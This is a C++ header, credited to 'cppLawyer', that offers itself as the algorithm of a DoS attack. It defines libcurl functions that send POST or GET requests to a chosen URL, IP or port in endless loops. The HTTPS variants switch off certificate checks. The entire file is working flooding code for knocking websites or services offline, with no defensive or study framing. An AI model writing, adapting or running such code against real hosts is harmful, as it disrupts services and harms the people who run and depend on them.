#ifndef DOS_H
#define DOS_H

/*

  **Abdelaziz aka cppLawyer**

 - This Release Only Contains The Algorithm of DoS attack.

*/

#include <iostream>
#include <curl/curl.h>
#include <thread>

namespace DoS {
	namespace do_not_touch {
		inline static size_t constexpr write_cb(char* d, size_t n, size_t l, void* p) noexcept
		{
			return n * l;
		}

		namespace POST {
			inline void const dosRegular(const std::string& info) noexcept {
				do {
					CURL* curl;
					curl_global_init(CURL_GLOBAL_ALL);
					curl = curl_easy_init();
					curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);
					curl_easy_setopt(curl, CURLOPT_URL, info.c_str());
					curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
					curl_easy_setopt(curl, CURLOPT_POST, 1LL);
					curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "foo=bar&foz=baz");
					curl_easy_perform(curl);
					curl_easy_cleanup(curl);
				} while (true);
			}//for IP-PORT Targeting and Website Targeting if protocol is HTTP 

			inline void const dosSSL(const std::string& info) noexcept {
				do {
					CURL* curl;
					curl_global_init(CURL_GLOBAL_ALL);
					curl = curl_easy_init();
					curl_easy_setopt(curl, CURLOPT_VERBOSE, 1);
					curl_easy_setopt(curl, CURLOPT_URL, info.c_str());
					curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
					curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
					curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
					curl_easy_setopt(curl, CURLOPT_POST, 1LL);
					curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "foo=bar&foz=baz");
					curl_easy_perform(curl);
					curl_easy_cleanup(curl);
				} while (true);
			}//for IP-PORT Targeting and Website Targeting if protocol is HTTPS 
		}

		namespace  GET {

			inline void const dosRegular(const std::string& info) noexcept {
				do {
					CURL* curl;
					curl_global_init(CURL_GLOBAL_DEFAULT);
					curl = std::move(curl_easy_init());
					curl_easy_setopt(curl, CURLOPT_URL, info.c_str());
					curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
					curl_easy_perform(curl);
					curl_easy_cleanup(curl);
					curl_global_cleanup();
				} while (true);
			}//for IP-PORT Targeting and Website Targeting if protocol is HTTP 

			inline void const dosSSL(const std::string& info) noexcept {
				do {
					CURL* curl;
					curl_global_init(CURL_GLOBAL_DEFAULT);
					curl = std::move(curl_easy_init());
					curl_easy_setopt(curl, CURLOPT_URL, info.c_str());
					curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
					curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
					curl_easy_perform(curl);
					curl_easy_cleanup(curl);
					curl_global_cleanup();

				} while (true);
			}//for IP-PORT Targeting and Website Targeting if protocol is HTTPS 
		}
	}
}
#endif // !DOS_H